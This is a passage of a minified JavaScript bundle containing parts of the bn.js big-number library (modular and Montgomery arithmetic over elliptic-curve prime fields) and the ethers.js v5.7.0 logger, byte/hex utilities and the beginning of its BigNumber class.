this.clone().iushln(e)},i.prototype.shrn=function(e){return this.clone().ishrn(e)},i.prototype.ushrn=function(e){return this.clone().iushrn(e)},i.prototype.testn=function(e){r("number"==typeof e&&e>=0);var t=e%26,n=(e-t)/26,i=1<<t;return!(this.length<=n||!(this.words[n]&i))},i.prototype.imaskn=function(e){r("number"==typeof e&&e>=0);var t=e%26,n=(e-t)/26;if(r(0===this.negative,"imaskn works only with positive numbers"),this.length<=n)return this;if(0!==t&&n++,this.length=Math.min(n,this.length),0!==t){var i=67108863^67108863>>>t<<t;this.words[this.length-1]&=i}return this._strip()},i.prototype.maskn=function(e){return this.clone().imaskn(e)},i.prototype.iaddn=function(e){return r("number"==typeof e),r(e<67108864),e<0?this.isubn(-e):0!==this.negative?1===this.length&&(0|this.words[0])<=e?(this.words[0]=e-(0|this.words[0]),this.negative=0,this):(this.negative=0,this.isubn(e),this.negative=1,this):this._iaddn(e)},i.prototype._iaddn=function(e){this.words[0]+=e;for(var t=0;t<this.length&&this.words[t]>=67108864;t++)this.words[t]-=67108864,t===this.length-1?this.words[t+1]=1:this.words[t+1]++;return this.length=Math.max(this.length,t+1),this},i.prototype.isubn=function(e){if(r("number"==typeof e),r(e<67108864),e<0)return this.iaddn(-e);if(0!==this.negative)return this.negative=0,this.iaddn(e),this.negative=1,this;if(this.words[0]-=e,1===this.length&&this.words[0]<0)this.words[0]=-this.words[0],this.negative=1;else for(var t=0;t<this.length&&this.words[t]<0;t++)this.words[t]+=67108864,this.words[t+1]-=1;return this._strip()},i.prototype.addn=function(e){return this.clone().iaddn(e)},i.prototype.subn=function(e){return this.clone().isubn(e)},i.prototype.iabs=function(){return this.negative=0,this},i.prototype.abs=function(){return this.clone().iabs()},i.prototype._ishlnsubmul=function(e,t,n){var i,o=e.length+n;this._expand(o);var s,a=0;for(i=0;i<e.length;i++){s=(0|this.words[i+n])+a;var c=(0|e.words[i])*t;a=((s-=67108863&c)>>26)-(c/67108864|0),this.words[i+n]=67108863&s}for(;i<this.length-n;i++)a=(s=(0|this.words[i+n])+a)>>26,this.words[i+n]=67108863&s;if(0===a)return this._strip();for(r(-1===a),a=0,i=0;i<this.length;i++)a=(s=-(0|this.words[i])+a)>>26,this.words[i]=67108863&s;return this.negative=1,this._strip()},i.prototype._wordDiv=function(e,t){var r=(this.length,e.length),n=this.clone(),o=e,s=0|o.words[o.length-1];0!=(r=26-this._countBits(s))&&(o=o.ushln(r),n.iushln(r),s=0|o.words[o.length-1]);var a,c=n.length-o.length;if("mod"!==t){(a=new i(null)).length=c+1,a.words=new Array(a.length);for(var l=0;l<a.length;l++)a.words[l]=0}var u=n.clone()._ishlnsubmul(o,1,c);0===u.negative&&(n=u,a&&(a.words[c]=1));for(var h=c-1;h>=0;h--){var d=67108864*(0|n.words[o.length+h])+(0|n.words[o.length+h-1]);for(d=Math.min(d/s|0,67108863),n._ishlnsubmul(o,d,h);0!==n.negative;)d--,n.negative=0,n._ishlnsubmul(o,1,h),n.isZero()||(n.negative^=1);a&&(a.words[h]=d)}return a&&a._strip(),n._strip(),"div"!==t&&0!==r&&n.iushrn(r),{div:a||null,mod:n}},i.prototype.divmod=function(e,t,n){return r(!e.isZero()),this.isZero()?{div:new i(0),mod:new i(0)}:0!==this.negative&&0===e.negative?(a=this.neg().divmod(e,t),"mod"!==t&&(o=a.div.neg()),"div"!==t&&(s=a.mod.neg(),n&&0!==s.negative&&s.iadd(e)),{div:o,mod:s}):0===this.negative&&0!==e.negative?(a=this.divmod(e.neg(),t),"mod"!==t&&(o=a.div.neg()),{div:o,mod:a.mod}):this.negative&e.negative?(a=this.neg().divmod(e.neg(),t),"div"!==t&&(s=a.mod.neg(),n&&0!==s.negative&&s.isub(e)),{div:a.div,mod:s}):e.length>this.length||this.cmp(e)<0?{div:new i(0),mod:this}:1===e.length?"div"===t?{div:this.divn(e.words[0]),mod:null}:"mod"===t?{div:null,mod:new i(this.modrn(e.words[0]))}:{div:this.divn(e.words[0]),mod:new i(this.modrn(e.words[0]))}:this._wordDiv(e,t);var o,s,a},i.prototype.div=function(e){return this.divmod(e,"div",!1).div},i.prototype.mod=function(e){return this.divmod(e,"mod",!1).mod},i.prototype.umod=function(e){return this.divmod(e,"mod",!0).mod},i.prototype.divRound=function(e){var t=this.divmod(e);if(t.mod.isZero())return t.div;var r=0!==t.div.negative?t.mod.isub(e):t.mod,n=e.ushrn(1),i=e.andln(1),o=r.cmp(n);return o<0||1===i&&0===o?t.div:0!==t.div.negative?t.div.isubn(1):t.div.iaddn(1)},i.prototype.modrn=function(e){var t=e<0;t&&(e=-e),r(e<=67108863);for(var n=(1<<26)%e,i=0,o=this.length-1;o>=0;o--)i=(n*i+(0|this.words[o]))%e;return t?-i:i},i.prototype.modn=function(e){return this.modrn(e)},i.prototype.idivn=function(e){var t=e<0;t&&(e=-e),r(e<=67108863);for(var n=0,i=this.length-1;i>=0;i--){var o=(0|this.words[i])+67108864*n;this.words[i]=o/e|0,n=o%e}return this._strip(),t?this.ineg():this},i.prototype.divn=function(e){return this.clone().idivn(e)},i.prototype.egcd=function(e){r(0===e.negative),r(!e.isZero());var t=this,n=e.clone();t=0!==t.negative?t.umod(e):t.clone();for(var o=new i(1),s=new i(0),a=new i(0),c=new i(1),l=0;t.isEven()&&n.isEven();)t.iushrn(1),n.iushrn(1),++l;for(var u=n.clone(),h=t.clone();!t.isZero();){for(var d=0,f=1;!(t.words[0]&f)&&d<26;++d,f<<=1);if(d>0)for(t.iushrn(d);d-- >0;)(o.isOdd()||s.isOdd())&&(o.iadd(u),s.isub(h)),o.iushrn(1),s.iushrn(1);for(var p=0,g=1;!(n.words[0]&g)&&p<26;++p,g<<=1);if(p>0)for(n.iushrn(p);p-- >0;)(a.isOdd()||c.isOdd())&&(a.iadd(u),c.isub(h)),a.iushrn(1),c.iushrn(1);t.cmp(n)>=0?(t.isub(n),o.isub(a),s.isub(c)):(n.isub(t),a.isub(o),c.isub(s))}return{a:a,b:c,gcd:n.iushln(l)}},i.prototype._invmp=function(e){r(0===e.negative),r(!e.isZero());var t,n=this,o=e.clone();n=0!==n.negative?n.umod(e):n.clone();for(var s=new i(1),a=new i(0),c=o.clone();n.cmpn(1)>0&&o.cmpn(1)>0;){for(var l=0,u=1;!(n.words[0]&u)&&l<26;++l,u<<=1);if(l>0)for(n.iushrn(l);l-- >0;)s.isOdd()&&s.iadd(c),s.iushrn(1);for(var h=0,d=1;!(o.words[0]&d)&&h<26;++h,d<<=1);if(h>0)for(o.iushrn(h);h-- >0;)a.isOdd()&&a.iadd(c),a.iushrn(1);n.cmp(o)>=0?(n.isub(o),s.isub(a)):(o.isub(n),a.isub(s))}return(t=0===n.cmpn(1)?s:a).cmpn(0)<0&&t.iadd(e),t},i.prototype.gcd=function(e){if(this.isZero())return e.abs();if(e.isZero())return this.abs();var t=this.clone(),r=e.clone();t.negative=0,r.negative=0;for(var n=0;t.isEven()&&r.isEven();n++)t.iushrn(1),r.iushrn(1);for(;;){for(;t.isEven();)t.iushrn(1);for(;r.isEven();)r.iushrn(1);var i=t.cmp(r);if(i<0){var o=t;t=r,r=o}else if(0===i||0===r.cmpn(1))break;t.isub(r)}return r.iushln(n)},i.prototype.invm=function(e){return this.egcd(e).a.umod(e)},i.prototype.isEven=function(){return 0==(1&this.words[0])},i.prototype.isOdd=function(){return 1==(1&this.words[0])},i.prototype.andln=function(e){return this.words[0]&e},i.prototype.bincn=function(e){r("number"==typeof e);var t=e%26,n=(e-t)/26,i=1<<t;if(this.length<=n)return this._expand(n+1),this.words[n]|=i,this;for(var o=i,s=n;0!==o&&s<this.length;s++){var a=0|this.words[s];o=(a+=o)>>>26,a&=67108863,this.words[s]=a}return 0!==o&&(this.words[s]=o,this.length++),this},i.prototype.isZero=function(){return 1===this.length&&0===this.words[0]},i.prototype.cmpn=function(e){var t,n=e<0;if(0!==this.negative&&!n)return-1;if(0===this.negative&&n)return 1;if(this._strip(),this.length>1)t=1;else{n&&(e=-e),r(e<=67108863,"Number is too big");var i=0|this.words[0];t=i===e?0:i<e?-1:1}return 0!==this.negative?0|-t:t},i.prototype.cmp=function(e){if(0!==this.negative&&0===e.negative)return-1;if(0===this.negative&&0!==e.negative)return 1;var t=this.ucmp(e);return 0!==this.negative?0|-t:t},i.prototype.ucmp=function(e){if(this.length>e.length)return 1;if(this.length<e.length)return-1;for(var t=0,r=this.length-1;r>=0;r--){var n=0|this.words[r],i=0|e.words[r];if(n!==i){n<i?t=-1:n>i&&(t=1);break}}return t},i.prototype.gtn=function(e){return 1===this.cmpn(e)},i.prototype.gt=function(e){return 1===this.cmp(e)},i.prototype.gten=function(e){return this.cmpn(e)>=0},i.prototype.gte=function(e){return this.cmp(e)>=0},i.prototype.ltn=function(e){return-1===this.cmpn(e)},i.prototype.lt=function(e){return-1===this.cmp(e)},i.prototype.lten=function(e){return this.cmpn(e)<=0},i.prototype.lte=function(e){return this.cmp(e)<=0},i.prototype.eqn=function(e){return 0===this.cmpn(e)},i.prototype.eq=function(e){return 0===this.cmp(e)},i.red=function(e){return new S(e)},i.prototype.toRed=function(e){return r(!this.red,"Already a number in reduction context"),r(0===this.negative,"red works only with positives"),e.convertTo(this)._forceRed(e)},i.prototype.fromRed=function(){return r(this.red,"fromRed works only with numbers in reduction context"),this.red.convertFrom(this)},i.prototype._forceRed=function(e){return this.red=e,this},i.prototype.forceRed=function(e){return r(!this.red,"Already a number in reduction context"),this._forceRed(e)},i.prototype.redAdd=function(e){return r(this.red,"redAdd works only with red numbers"),this.red.add(this,e)},i.prototype.redIAdd=function(e){return r(this.red,"redIAdd works only with red numbers"),this.red.iadd(this,e)},i.prototype.redSub=function(e){return r(this.red,"redSub works only with red numbers"),this.red.sub(this,e)},i.prototype.redISub=function(e){return r(this.red,"redISub works only with red numbers"),this.red.isub(this,e)},i.prototype.redShl=function(e){return r(this.red,"redShl works only with red numbers"),this.red.shl(this,e)},i.prototype.redMul=function(e){return r(this.red,"redMul works only with red numbers"),this.red._verify2(this,e),this.red.mul(this,e)},i.prototype.redIMul=function(e){return r(this.red,"redMul works only with red numbers"),this.red._verify2(this,e),this.red.imul(this,e)},i.prototype.redSqr=function(){return r(this.red,"redSqr works only with red numbers"),this.red._verify1(this),this.red.sqr(this)},i.prototype.redISqr=function(){return r(this.red,"redISqr works only with red numbers"),this.red._verify1(this),this.red.isqr(this)},i.prototype.redSqrt=function(){return r(this.red,"redSqrt works only with red numbers"),this.red._verify1(this),this.red.sqrt(this)},i.prototype.redInvm=function(){return r(this.red,"redInvm works only with red numbers"),this.red._verify1(this),this.red.invm(this)},i.prototype.redNeg=function(){return r(this.red,"redNeg works only with red numbers"),this.red._verify1(this),this.red.neg(this)},i.prototype.redPow=function(e){return r(this.red&&!e.red,"redPow(normalNum)"),this.red._verify1(this),this.red.pow(this,e)};var y={k256:null,p224:null,p192:null,p25519:null};function b(e,t){this.name=e,this.p=new i(t,16),this.n=this.p.bitLength(),this.k=new i(1).iushln(this.n).isub(this.p),this.tmp=this._tmp()}function w(){b.call(this,"k256","ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")}function _(){b.call(this,"p224","ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")}function E(){b.call(this,"p192","ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")}function x(){b.call(this,"25519","7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")}function S(e){if("string"==typeof e){var t=i._prime(e);this.m=t.p,this.prime=t}else r(e.gtn(1),"modulus must be greater than 1"),this.m=e,this.prime=null}function A(e){S.call(this,e),this.shift=this.m.bitLength(),this.shift%26!=0&&(this.shift+=26-this.shift%26),this.r=new i(1).iushln(this.shift),this.r2=this.imod(this.r.sqr()),this.rinv=this.r._invmp(this.m),this.minv=this.rinv.mul(this.r).isubn(1).div(this.m),this.minv=this.minv.umod(this.r),this.minv=this.r.sub(this.minv)}b.prototype._tmp=function(){var e=new i(null);return e.words=new Array(Math.ceil(this.n/13)),e},b.prototype.ireduce=function(e){var t,r=e;do{this.split(r,this.tmp),t=(r=(r=this.imulK(r)).iadd(this.tmp)).bitLength()}while(t>this.n);var n=t<this.n?-1:r.ucmp(this.p);return 0===n?(r.words[0]=0,r.length=1):n>0?r.isub(this.p):void 0!==r.strip?r.strip():r._strip(),r},b.prototype.split=function(e,t){e.iushrn(this.n,0,t)},b.prototype.imulK=function(e){return e.imul(this.k)},n(w,b),w.prototype.split=function(e,t){for(var r=4194303,n=Math.min(e.length,9),i=0;i<n;i++)t.words[i]=e.words[i];if(t.length=n,e.length<=9)return e.words[0]=0,void(e.length=1);var o=e.words[9];for(t.words[t.length++]=o&r,i=10;i<e.length;i++){var s=0|e.words[i];e.words[i-10]=(s&r)<<4|o>>>22,o=s}o>>>=22,e.words[i-10]=o,0===o&&e.length>10?e.length-=10:e.length-=9},w.prototype.imulK=function(e){e.words[e.length]=0,e.words[e.length+1]=0,e.length+=2;for(var t=0,r=0;r<e.length;r++){var n=0|e.words[r];t+=977*n,e.words[r]=67108863&t,t=64*n+(t/67108864|0)}return 0===e.words[e.length-1]&&(e.length--,0===e.words[e.length-1]&&e.length--),e},n(_,b),n(E,b),n(x,b),x.prototype.imulK=function(e){for(var t=0,r=0;r<e.length;r++){var n=19*(0|e.words[r])+t,i=67108863&n;n>>>=26,e.words[r]=i,t=n}return 0!==t&&(e.words[e.length++]=t),e},i._prime=function(e){if(y[e])return y[e];var t;if("k256"===e)t=new w;else if("p224"===e)t=new _;else if("p192"===e)t=new E;else{if("p25519"!==e)throw new Error("Unknown prime "+e);t=new x}return y[e]=t,t},S.prototype._verify1=function(e){r(0===e.negative,"red works only with positives"),r(e.red,"red works only with red numbers")},S.prototype._verify2=function(e,t){r(0==(e.negative|t.negative),"red works only with positives"),r(e.red&&e.red===t.red,"red works only with red numbers")},S.prototype.imod=function(e){return this.prime?this.prime.ireduce(e)._forceRed(this):(l(e,e.umod(this.m)._forceRed(this)),e)},S.prototype.neg=function(e){return e.isZero()?e.clone():this.m.sub(e)._forceRed(this)},S.prototype.add=function(e,t){this._verify2(e,t);var r=e.add(t);return r.cmp(this.m)>=0&&r.isub(this.m),r._forceRed(this)},S.prototype.iadd=function(e,t){this._verify2(e,t);var r=e.iadd(t);return r.cmp(this.m)>=0&&r.isub(this.m),r},S.prototype.sub=function(e,t){this._verify2(e,t);var r=e.sub(t);return r.cmpn(0)<0&&r.iadd(this.m),r._forceRed(this)},S.prototype.isub=function(e,t){this._verify2(e,t);var r=e.isub(t);return r.cmpn(0)<0&&r.iadd(this.m),r},S.prototype.shl=function(e,t){return this._verify1(e),this.imod(e.ushln(t))},S.prototype.imul=function(e,t){return this._verify2(e,t),this.imod(e.imul(t))},S.prototype.mul=function(e,t){return this._verify2(e,t),this.imod(e.mul(t))},S.prototype.isqr=function(e){return this.imul(e,e.clone())},S.prototype.sqr=function(e){return this.mul(e,e)},S.prototype.sqrt=function(e){if(e.isZero())return e.clone();var t=this.m.andln(3);if(r(t%2==1),3===t){var n=this.m.add(new i(1)).iushrn(2);return this.pow(e,n)}for(var o=this.m.subn(1),s=0;!o.isZero()&&0===o.andln(1);)s++,o.iushrn(1);r(!o.isZero());var a=new i(1).toRed(this),c=a.redNeg(),l=this.m.subn(1).iushrn(1),u=this.m.bitLength();for(u=new i(2*u*u).toRed(this);0!==this.pow(u,l).cmp(c);)u.redIAdd(c);for(var h=this.pow(u,o),d=this.pow(e,o.addn(1).iushrn(1)),f=this.pow(e,o),p=s;0!==f.cmp(a);){for(var g=f,m=0;0!==g.cmp(a);m++)g=g.redSqr();r(m<p);var v=this.pow(h,new i(1).iushln(p-m-1));d=d.redMul(v),h=v.redSqr(),f=f.redMul(h),p=m}return d},S.prototype.invm=function(e){var t=e._invmp(this.m);return 0!==t.negative?(t.negative=0,this.imod(t).redNeg()):this.imod(t)},S.prototype.pow=function(e,t){if(t.isZero())return new i(1).toRed(this);if(0===t.cmpn(1))return e.clone();var r=new Array(16);r[0]=new i(1).toRed(this),r[1]=e;for(var n=2;n<r.length;n++)r[n]=this.mul(r[n-1],e);var o=r[0],s=0,a=0,c=t.bitLength()%26;for(0===c&&(c=26),n=t.length-1;n>=0;n--){for(var l=t.words[n],u=c-1;u>=0;u--){var h=l>>u&1;o!==r[0]&&(o=this.sqr(o)),0!==h||0!==s?(s<<=1,s|=h,(4==++a||0===n&&0===u)&&(o=this.mul(o,r[s]),a=0,s=0)):a=0}c=26}return o},S.prototype.convertTo=function(e){var t=e.umod(this.m);return t===e?t.clone():t},S.prototype.convertFrom=function(e){var t=e.clone();return t.red=null,t},i.mont=function(e){return new A(e)},n(A,S),A.prototype.convertTo=function(e){return this.imod(e.ushln(this.shift))},A.prototype.convertFrom=function(e){var t=this.imod(e.mul(this.rinv));return t.red=null,t},A.prototype.imul=function(e,t){if(e.isZero()||t.isZero())return e.words[0]=0,e.length=1,e;var r=e.imul(t),n=r.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),i=r.isub(n).iushrn(this.shift),o=i;return i.cmp(this.m)>=0?o=i.isub(this.m):i.cmpn(0)<0&&(o=i.iadd(this.m)),o._forceRed(this)},A.prototype.mul=function(e,t){if(e.isZero()||t.isZero())return new i(0)._forceRed(this);var r=e.mul(t),n=r.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),o=r.isub(n).iushrn(this.shift),s=o;return o.cmp(this.m)>=0?s=o.isub(this.m):o.cmpn(0)<0&&(s=o.iadd(this.m)),s._forceRed(this)},A.prototype.invm=function(e){return this.imod(e._invmp(this.m).mul(this.r2))._forceRed(this)}}(c_,Ue);var F0=c_.exports;const Ot=tu(F0),cY="logger/5.7.0";let t8=!1,r8=!1;const X1={debug:1,default:2,info:2,warning:3,error:4,off:5};let n8=X1.default,zw=null;function lY(){try{const e=[];if(["NFD","NFC","NFKD","NFKC"].forEach((t=>{try{if("test"!=="test".normalize(t))throw new Error("bad normalize")}catch{e.push(t)}})),e.length)throw new Error("missing "+e.join(", "));if(String.fromCharCode(233).normalize("NFD")!==String.fromCharCode(101,769))throw new Error("broken implementation")}catch(e){return e.message}return null}const i8=lY();var k2,lo;!function(e){e.DEBUG="DEBUG",e.INFO="INFO",e.WARNING="WARNING",e.ERROR="ERROR",e.OFF="OFF"}(k2||(k2={})),function(e){e.UNKNOWN_ERROR="UNKNOWN_ERROR",e.NOT_IMPLEMENTED="NOT_IMPLEMENTED",e.UNSUPPORTED_OPERATION="UNSUPPORTED_OPERATION",e.NETWORK_ERROR="NETWORK_ERROR",e.SERVER_ERROR="SERVER_ERROR",e.TIMEOUT="TIMEOUT",e.BUFFER_OVERRUN="BUFFER_OVERRUN",e.NUMERIC_FAULT="NUMERIC_FAULT",e.MISSING_NEW="MISSING_NEW",e.INVALID_ARGUMENT="INVALID_ARGUMENT",e.MISSING_ARGUMENT="MISSING_ARGUMENT",e.UNEXPECTED_ARGUMENT="UNEXPECTED_ARGUMENT",e.CALL_EXCEPTION="CALL_EXCEPTION",e.INSUFFICIENT_FUNDS="INSUFFICIENT_FUNDS",e.NONCE_EXPIRED="NONCE_EXPIRED",e.REPLACEMENT_UNDERPRICED="REPLACEMENT_UNDERPRICED",e.UNPREDICTABLE_GAS_LIMIT="UNPREDICTABLE_GAS_LIMIT",e.TRANSACTION_REPLACED="TRANSACTION_REPLACED",e.ACTION_REJECTED="ACTION_REJECTED"}(lo||(lo={}));const s8="0123456789abcdef";class we{constructor(e){Object.defineProperty(this,"version",{enumerable:!0,value:e,writable:!1})}_log(e,t){const r=e.toLowerCase();null==X1[r]&&this.throwArgumentError("invalid log level name","logLevel",e),!(n8>X1[r])&&console.log.apply(console,t)}debug(...e){this._log(we.levels.DEBUG,e)}info(...e){this._log(we.levels.INFO,e)}warn(...e){this._log(we.levels.WARNING,e)}makeError(e,t,r){if(r8)return this.makeError("censored error",t,{});t||(t=we.errors.UNKNOWN_ERROR),r||(r={});const n=[];Object.keys(r).forEach((e=>{const t=r[e];try{if(t instanceof Uint8Array){let r="";for(let e=0;e<t.length;e++)r+=s8[t[e]>>4],r+=s8[15&t[e]];n.push(e+"=Uint8Array(0x"+r+")")}else n.push(e+"="+JSON.stringify(t))}catch{n.push(e+"="+JSON.stringify(r[e].toString()))}})),n.push(`code=${t}`),n.push(`version=${this.version}`);const i=e;let o="";switch(t){case lo.NUMERIC_FAULT:{o="NUMERIC_FAULT";const t=e;switch(t){case"overflow":case"underflow":case"division-by-zero":o+="-"+t;break;case"negative-power":case"negative-width":o+="-unsupported";break;case"unbound-bitwise-result":o+="-unbound-result"}break}case lo.CALL_EXCEPTION:case lo.INSUFFICIENT_FUNDS:case lo.MISSING_NEW:case lo.NONCE_EXPIRED:case lo.REPLACEMENT_UNDERPRICED:case lo.TRANSACTION_REPLACED:case lo.UNPREDICTABLE_GAS_LIMIT:o=t}o&&(e+=" [ See: https://links.ethers.org/v5-errors-"+o+" ]"),n.length&&(e+=" ("+n.join(", ")+")");const s=new Error(e);return s.reason=i,s.code=t,Object.keys(r).forEach((function(e){s[e]=r[e]})),s}throwError(e,t,r){throw this.makeError(e,t,r)}throwArgumentError(e,t,r){return this.throwError(e,we.errors.INVALID_ARGUMENT,{argument:t,value:r})}assert(e,t,r,n){e||this.throwError(t,r,n)}assertArgument(e,t,r,n){e||this.throwArgumentError(t,r,n)}checkNormalize(e){i8&&this.throwError("platform missing String.prototype.normalize",we.errors.UNSUPPORTED_OPERATION,{operation:"String.prototype.normalize",form:i8})}checkSafeUint53(e,t){"number"==typeof e&&(null==t&&(t="value not safe"),(e<0||e>=9007199254740991)&&this.throwError(t,we.errors.NUMERIC_FAULT,{operation:"checkSafeInteger",fault:"out-of-safe-range",value:e}),e%1&&this.throwError(t,we.errors.NUMERIC_FAULT,{operation:"checkSafeInteger",fault:"non-integer",value:e}))}checkArgumentCount(e,t,r){r=r?": "+r:"",e<t&&this.throwError("missing argument"+r,we.errors.MISSING_ARGUMENT,{count:e,expectedCount:t}),e>t&&this.throwError("too many arguments"+r,we.errors.UNEXPECTED_ARGUMENT,{count:e,expectedCount:t})}checkNew(e,t){(e===Object||null==e)&&this.throwError("missing new",we.errors.MISSING_NEW,{name:t.name})}checkAbstract(e,t){e===t?this.throwError("cannot instantiate abstract class "+JSON.stringify(t.name)+" directly; use a sub-class",we.errors.UNSUPPORTED_OPERATION,{name:e.name,operation:"new"}):(e===Object||null==e)&&this.throwError("missing new",we.errors.MISSING_NEW,{name:t.name})}static globalLogger(){return zw||(zw=new we(cY)),zw}static setCensorship(e,t){if(!e&&t&&this.globalLogger().throwError("cannot permanently disable censorship",we.errors.UNSUPPORTED_OPERATION,{operation:"setCensorship"}),t8){if(!e)return;this.globalLogger().throwError("error censorship permanent",we.errors.UNSUPPORTED_OPERATION,{operation:"setCensorship"})}r8=!!e,t8=!!t}static setLogLevel(e){const t=X1[e.toLowerCase()];null!=t?n8=t:we.globalLogger().warn("invalid log level - "+e)}static from(e){return new we(e)}}we.errors=lo,we.levels=k2;const uY="bytes/5.7.0",Kr=new we(uY);function zI(e){return!!e.toHexString}function uf(e){return e.slice||(e.slice=function(){const t=Array.prototype.slice.call(arguments);return uf(new Uint8Array(Array.prototype.slice.apply(e,t)))}),e}function l_(e){return Nr(e)&&!(e.length%2)||uh(e)}function o8(e){return"number"==typeof e&&e==e&&e%1==0}function uh(e){if(null==e)return!1;if(e.constructor===Uint8Array)return!0;if("string"==typeof e||!o8(e.length)||e.length<0)return!1;for(let t=0;t<e.length;t++){const r=e[t];if(!o8(r)||r<0||r>=256)return!1}return!0}function Lt(e,t){if(t||(t={}),"number"==typeof e){Kr.checkSafeUint53(e,"invalid arrayify value");const t=[];for(;e;)t.unshift(255&e),e=parseInt(String(e/256));return 0===t.length&&t.push(0),uf(new Uint8Array(t))}if(t.allowMissingPrefix&&"string"==typeof e&&"0x"!==e.substring(0,2)&&(e="0x"+e),zI(e)&&(e=e.toHexString()),Nr(e)){let r=e.substring(2);r.length%2&&("left"===t.hexPad?r="0"+r:"right"===t.hexPad?r+="0":Kr.throwArgumentError("hex data is odd-length","value",e));const n=[];for(let e=0;e<r.length;e+=2)n.push(parseInt(r.substring(e,e+2),16));return uf(new Uint8Array(n))}return uh(e)?uf(new Uint8Array(e)):Kr.throwArgumentError("invalid arrayify value","value",e)}function Pl(e){const t=e.map((e=>Lt(e))),r=t.reduce(((e,t)=>e+t.length),0),n=new Uint8Array(r);return t.reduce(((e,t)=>(n.set(t,e),e+t.length)),0),uf(n)}function Df(e){let t=Lt(e);if(0===t.length)return t;let r=0;for(;r<t.length&&0===t[r];)r++;return r&&(t=t.slice(r)),t}function fY(e,t){(e=Lt(e)).length>t&&Kr.throwArgumentError("value out of range","value",arguments[0]);const r=new Uint8Array(t);return r.set(e,t-e.length),uf(r)}function Nr(e,t){return!("string"!=typeof e||!e.match(/^0x[0-9A-Fa-f]*$/)||t&&e.length!==2+2*t)}const Hw="0123456789abcdef";function kt(e,t){if(t||(t={}),"number"==typeof e){Kr.checkSafeUint53(e,"invalid hexlify value");let t="";for(;e;)t=Hw[15&e]+t,e=Math.floor(e/16);return t.length?(t.length%2&&(t="0"+t),"0x"+t):"0x00"}if("bigint"==typeof e)return(e=e.toString(16)).length%2?"0x0"+e:"0x"+e;if(t.allowMissingPrefix&&"string"==typeof e&&"0x"!==e.substring(0,2)&&(e="0x"+e),zI(e))return e.toHexString();if(Nr(e))return e.length%2&&("left"===t.hexPad?e="0x0"+e.substring(2):"right"===t.hexPad?e+="0":Kr.throwArgumentError("hex data is odd-length","value",e)),e.toLowerCase();if(uh(e)){let t="0x";for(let r=0;r<e.length;r++){let n=e[r];t+=Hw[(240&n)>>4]+Hw[15&n]}return t}return Kr.throwArgumentError("invalid hexlify value","value",e)}function Vl(e){if("string"!=typeof e)e=kt(e);else if(!Nr(e)||e.length%2)return null;return(e.length-2)/2}function mi(e,t,r){return"string"!=typeof e?e=kt(e):(!Nr(e)||e.length%2)&&Kr.throwArgumentError("invalid hexData","value",e),t=2+2*t,null!=r?"0x"+e.substring(t,2+2*r):"0x"+e.substring(t)}function ss(e){let t="0x";return e.forEach((e=>{t+=kt(e).substring(2)})),t}function u_(e){const t=hY(kt(e,{hexPad:"left"}));return"0x"===t?"0x0":t}function hY(e){"string"!=typeof e&&(e=kt(e)),Nr(e)||Kr.throwArgumentError("invalid hex string","value",e),e=e.substring(2);let t=0;for(;t<e.length&&"0"===e[t];)t++;return"0x"+e.substring(t)}function Jr(e,t){for("string"!=typeof e?e=kt(e):Nr(e)||Kr.throwArgumentError("invalid hex string","value",e),e.length>2*t+2&&Kr.throwArgumentError("value out of range","value",arguments[1]);e.length<2*t+2;)e="0x0"+e.substring(2);return e}function Bv(e){const t={r:"0x",s:"0x",_vs:"0x",recoveryParam:0,v:0,yParityAndS:"0x",compact:"0x"};if(l_(e)){let r=Lt(e);64===r.length?(t.v=27+(r[32]>>7),r[32]&=127,t.r=kt(r.slice(0,32)),t.s=kt(r.slice(32,64))):65===r.length?(t.r=kt(r.slice(0,32)),t.s=kt(r.slice(32,64)),t.v=r[64]):Kr.throwArgumentError("invalid signature string","signature",e),t.v<27&&(0===t.v||1===t.v?t.v+=27:Kr.throwArgumentError("signature invalid v byte","signature",e)),t.recoveryParam=1-t.v%2,t.recoveryParam&&(r[32]|=128),t._vs=kt(r.slice(32,64))}else{if(t.r=e.r,t.s=e.s,t.v=e.v,t.recoveryParam=e.recoveryParam,t._vs=e._vs,null!=t._vs){const r=fY(Lt(t._vs),32);t._vs=kt(r);const n=r[0]>=128?1:0;null==t.recoveryParam?t.recoveryParam=n:t.recoveryParam!==n&&Kr.throwArgumentError("signature recoveryParam mismatch _vs","signature",e),r[0]&=127;const i=kt(r);null==t.s?t.s=i:t.s!==i&&Kr.throwArgumentError("signature v mismatch _vs","signature",e)}if(null==t.recoveryParam)null==t.v?Kr.throwArgumentError("signature missing v and recoveryParam","signature",e):0===t.v||1===t.v?t.recoveryParam=t.v:t.recoveryParam=1-t.v%2;else if(null==t.v)t.v=27+t.recoveryParam;else{const r=0===t.v||1===t.v?t.v:1-t.v%2;t.recoveryParam!==r&&Kr.throwArgumentError("signature recoveryParam mismatch v","signature",e)}null!=t.r&&Nr(t.r)?t.r=Jr(t.r,32):Kr.throwArgumentError("signature missing or invalid r","signature",e),null!=t.s&&Nr(t.s)?t.s=Jr(t.s,32):Kr.throwArgumentError("signature missing or invalid s","signature",e);const r=Lt(t.s);r[0]>=128&&Kr.throwArgumentError("signature s out of range","signature",e),t.recoveryParam&&(r[0]|=128);const n=kt(r);t._vs&&(Nr(t._vs)||Kr.throwArgumentError("signature invalid _vs","signature",e),t._vs=Jr(t._vs,32)),null==t._vs?t._vs=n:t._vs!==n&&Kr.throwArgumentError("signature _vs mismatch v and s","signature",e)}return t.yParityAndS=t._vs,t.compact=t.r+t.yParityAndS.substring(2),t}const HI="bignumber/5.7.0";var Ug=Ot.BN;const Ta=new we(HI),qw={},a8=9007199254740991;function dY(e){return null!=e&&(Ke.isBigNumber(e)||"number"==typeof e&&e%1==0||"string"==typeof e&&!!e.match(/^-?[0-9]+$/)||Nr(e)||"bigint"==typeof e||uh(e))}let c8=!1;class Ke{constructor(e,t){e!==qw&&Ta.throwError("cannot call constructor directly; use BigNumber.from",we.errors.UNSUPPORTED_OPERATION,{operation:"new (BigNumber)"}),this._hex=t,this._isBigNumber=!0,Object.freeze(this)}fromTwos(e){return $i(Zt(this).fromTwos(e))}toTwos(e){return $i(Zt(this).toTwos(e))}abs(){return"-"===this._hex[0]?Ke.from(this._hex.substring(1)):this}add(e){return $i(Zt(this).add(Zt(e)))}sub(e){return $i(Zt(this).sub(Zt(e)))}div(e){return 